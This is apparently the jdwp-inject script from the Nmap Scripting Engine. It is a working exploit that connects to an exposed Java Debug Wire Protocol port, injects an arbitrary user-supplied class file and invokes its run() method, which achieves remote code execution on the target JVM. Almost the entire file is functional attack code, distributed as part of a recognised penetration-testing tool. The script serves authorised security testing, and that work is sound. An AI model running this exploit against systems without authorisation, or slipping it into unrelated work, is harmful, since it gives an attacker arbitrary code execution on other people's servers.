local bin = require "bin"
local io = require "io"
local jdwp = require "jdwp"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"

description = [[
Attempts to exploit java's remote debugging port.  When remote debugging port
is left open, it is possible to inject  java bytecode and achieve remote code
execution.  This script allows injection of arbitrary class files.

After injection, class' run() method is executed.
Method run() has no parameters, and is expected to return a string.

You must specify your own .class file to inject by <code>filename</code> argument.
See nselib/data/jdwp-class/README for more.
]]

---
-- @usage nmap -sT <target> -p <port> --script=+jdwp-inject --script-args filename=HelloWorld.class
--
-- @args jdwp-inject.filename Java <code>.class</code> file to inject.
-- @output
-- PORT     STATE SERVICE REASON
-- 2010/tcp open  search  syn-ack
-- | jdwp-inject:
-- |_  Hello world from the remote machine!

author = "Aleksandar Nikolic"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","intrusive"}

portrule = function(host, port)
  -- JDWP will close the port if there is no valid handshake within 2
  -- seconds, Service detection's NULL probe detects it as tcpwrapped.
  return port.service == "tcpwrapped"
    and port.protocol == "tcp" and port.state == "open"
    and not(shortport.port_is_excluded(port.number,port.protocol))
end

action = function(host, port)
  stdnse.sleep(5) -- let the remote socket recover from connect() scan
  local status,socket = jdwp.connect(host,port) -- initialize the connection
  if not status then
    stdnse.debug1("error, %s",socket)
    return nil
  end

  -- read .class file
  local filename = stdnse.get_script_args(SCRIPT_NAME .. '.filename')
  if filename == nil then
    return stdnse.format_output(false, "This script requires a .class file to inject.")
  end
  local file = io.open(nmap.fetchfile(filename) or filename, "rb")
  local class_bytes = file:read("a")
  file:close()

  -- inject the class
  local injectedClass
  status,injectedClass = jdwp.injectClass(socket,class_bytes)
  if not status then
    stdnse.debug1("Failed to inject class")
    return stdnse.format_output(false, "Failed to inject class")
  end
  -- find injected class method
  local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)

  if runMethodID == nil then
    stdnse.debug1("Couldn't find run method")
    return stdnse.format_output(false, "Couldn't find run method.")
  end

  -- invoke run method
  local result
  status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,0,nil)
  if not status then
    stdnse.debug1("Couldn't invoke run method")
    return stdnse.format_output(false, result)
  end
  -- get the result string
  local _,_,stringID = bin.unpack(">CL",result)
  status,result = jdwp.readString(socket,0,stringID)
  -- parse results
  return stdnse.format_output(status,result)
end

